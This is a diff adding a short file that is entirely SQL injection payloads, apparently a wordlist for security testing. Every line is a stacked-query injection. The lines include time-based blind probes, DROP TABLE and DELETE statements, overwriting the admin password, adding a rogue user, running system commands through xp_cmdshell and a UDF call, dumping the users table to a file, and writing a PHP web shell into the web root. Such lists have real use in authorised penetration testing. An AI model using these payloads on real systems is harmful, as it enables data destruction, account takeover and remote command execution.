@@ -1,0 +1,13 @@
+'; SELECT SLEEP(5) --
+'; DROP TABLE users --
+'; DELETE FROM users --
+'; UPDATE users SET password='hacked' WHERE username='admin' --
+'; INSERT INTO users VALUES ('hacker','pass') --
+'; EXEC xp_cmdshell('whoami') --
+'; CREATE TABLE backdoor (cmd TEXT) --
+'; INSERT INTO backdoor VALUES ('echo "hacked"') --
+'; SELECT * FROM users INTO OUTFILE '/tmp/users.txt' --
+'; SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php' --
+'; CALL mysql.udf.cmd('whoami') --
+'; SELECT pg_sleep(5); SELECT pg_sleep(5) --
+'; WAITFOR DELAY '00:00:05'; WAITFOR DELAY '00:00:05' --
